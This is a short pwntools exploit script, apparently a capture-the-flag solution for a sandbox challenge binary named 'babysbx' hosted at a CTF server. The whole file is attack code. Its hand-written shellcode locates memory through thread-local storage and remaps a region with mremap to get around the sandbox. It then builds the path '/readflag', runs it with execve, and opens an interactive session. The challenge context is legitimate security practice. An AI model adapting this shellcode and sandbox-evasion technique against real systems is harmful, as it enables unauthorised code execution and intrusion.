#!/usr/bin/env python3

from pwn import *

BINARY = "./babysbx"
context.binary = elf = ELF(BINARY)
io = elf.debug()
#p = remote("blackhat.flagyard.com", 32536)
io.recvuntil("shellcode: ")

shellcode = asm("mov rax, fs:[0x0]; add rax, 0xb60; mov rax, QWORD PTR [rax];  add rax, 0x38a80; mov rax, QWORD PTR [rax]; lea rsp, [rip + 0x500]; mov rbx, rax; add rbx, 0x4000; mov rcx, rax; add rcx, 0x2000; " + shellcraft.mremap("rbx", 0x1000, 0x1000,  3, "rcx")) #move bss to no-readable mem
shellcode += asm("mov rdi, rax; add rdi, 0x50; mov DWORD PTR [rdi], 0x6165722f; mov DWORD PTR [rdi+4], 0x616c6664; mov DWORD PTR [rdi+0x8], 0x67; mov eax, 0x3b; mov rdx, 0; mov rsi, 0; syscall") #write readflag and call execve
open("payload", "wb").write(shellcode.ljust(4096, b'\x00'))

io.sendline(shellcode.ljust(4096, b'\x00'))
io.interactive()
